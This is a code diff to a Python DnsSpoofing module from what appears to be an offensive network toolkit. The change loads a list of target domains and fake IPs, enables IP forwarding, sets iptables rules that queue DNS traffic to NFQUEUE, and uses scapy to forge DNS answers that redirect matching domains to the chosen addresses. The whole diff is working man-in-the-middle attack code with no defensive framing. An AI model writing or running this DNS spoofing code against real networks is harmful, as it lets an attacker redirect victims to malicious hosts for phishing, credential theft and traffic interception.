@@ -8,7 +8,10 @@ class DnsSpoofing(CommandModule) :
     command = "dns"
     outline = "--"
     manual = "--"
+
+
     nfqueue = {}
+    fakeDnsIpDictionary = {}
 
 
     def getNFQueue(self, num) :
@@ -18,28 +21,37 @@ class DnsSpoofing(CommandModule) :
 	
 
     def run(self) :
-        if False == NetSetup.getInstance().checkIpForward() :
-            NetSetup.getInstance().ipForward(1)
+        # Get Dns Spoofing target list.
+        filename = "dnsSpoofingList.txt"
+        try :
+            f = open(filename, 'r')
+            lines = f.readlines()
+            for line in lines :
+                dns, ip = line.replace(' ', '').split(',')
+                self.fakeDnsIpDictionary[dns] = ip
+            f.close()
+        except :
+            print("[Error] %s file is not exist" % filename)
+            return
+
+
+        # Make IP Forwarding.
+        if False == NetEnvManager.getInstance().checkIpForward() :
+            NetEnvManager.getInstance().ipForward(1)
 
 
         # This rule of iptables can make a packet which is modifiable.
         queryID = 1
-        table = "-t nat "
+        table = "-t nat"
         checkOpt = "\"udp dpt:53 NFQUEUE num " + str(queryID) + "\""
         iptablesOpt = table + " -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num " + str(queryID)
-        if False == NetSetup.getInstance().checkIpTables(table, checkOpt) :
-            NetSetup.getInstance().ipTables(iptablesOpt)
-
-        table = ""
-        checkOpt = "\"udp spt:53\""
-        iptablesOpt = table + "-A FORWARD -p udp --sport 53 -j DROP"
-        if False == NetSetup.getInstance().checkIpTables(table, checkOpt) :
-            NetSetup.getInstance().ipTables(iptablesOpt)
-
+        if False == NetEnvManager.getInstance().checkIpTables(table, checkOpt) :
+            NetEnvManager.getInstance().ipTables(iptablesOpt)
         
+
         # DNS-Spoofing
         _thread.start_new_thread(self.dnsCachePoisoning, ("DNS cache poisoning", queryID))
-        # self.dnsCachePoisoning(queryID)
+        # self.dnsCachePoisoning("DNS cache poisoning", queryID)
 
 
     def dnsCachePoisoning(self, title, queryID) :
@@ -51,40 +63,42 @@ class DnsSpoofing(CommandModule) :
         except KeyboardInterrupt :
             self.getNFQueue(queryID).unbind()
 
-            NetSetup.getInstance().ipForward(0)
-            iptablesOpt = "-F"
-            NetSetup.getInstance().ipTables(iptablesOpt)
+            NetEnvManager.getInstance().ipForward(0)
             iptablesOpt = "-t nat -F"
-            NetSetup.getInstance().ipTables(iptablesOpt)
+            NetEnvManager.getInstance().ipTables(iptablesOpt)
 
 
     def dnsQueryCallback(self, packet) :
         print("# DNS Query")
-        resq = self.makeDnsResponse(packet)
-        send(resq)
-        packet.drop()
-
-
-    def makeDnsResponse(self, packet) :
         pkt = IP(packet.get_payload())
         # pkt.show()
-        fakeIp = "125.209.222.141"	# naver.com
+        # if pkt[DNS].qd.qname in self.fakeDnsIpDictionary.keys() :
+        for dn in self.fakeDnsIpDictionary.keys() :
+            if dn in str(pkt[DNS].qd.qname) :
+                resq = self.makeDnsResponse(pkt, dn)
+                send(resq)
+                packet.drop()
+                return
+        packet.accept()
+
+
+    def makeDnsResponse(self, packet, targetDomain) :
         ip = IP()
-        ip.src = pkt[IP].dst
-        ip.dst = pkt[IP].src
+        ip.src = packet[IP].dst
+        ip.dst = packet[IP].src
 
         udp = UDP()
-        udp.sport = pkt[UDP].dport
-        udp.dport = pkt[UDP].sport
+        udp.sport = packet[UDP].dport
+        udp.dport = packet[UDP].sport
 
         dns = DNS()
-        dns.id = pkt[DNS].id	# Transaction ID.
+        dns.id = packet[DNS].id	# Transaction ID.
         dns.qr      = 1			# query or response.
         dns.rd      = 0			# Recursion desired.
         dns.qdcount = 1			# Question count.
         dns.ancount = 1			# Answer count.
-        dns.qd = pkt[DNS].qd
-        dns.an = DNSRR(rrname=pkt[DNS].qd.qname, type=1, rclass=0x0001, ttl=25740, rdlen=4, rdata=fakeIp)
+        dns.qd = packet[DNS].qd
+        dns.an = DNSRR(rrname=packet[DNS].qd.qname, type=1, rclass=0x0001, ttl=25740, rdlen=4, rdata=self.fakeDnsIpDictionary[targetDomain])
 
         resp = ip/udp/dns
         # resp.show()
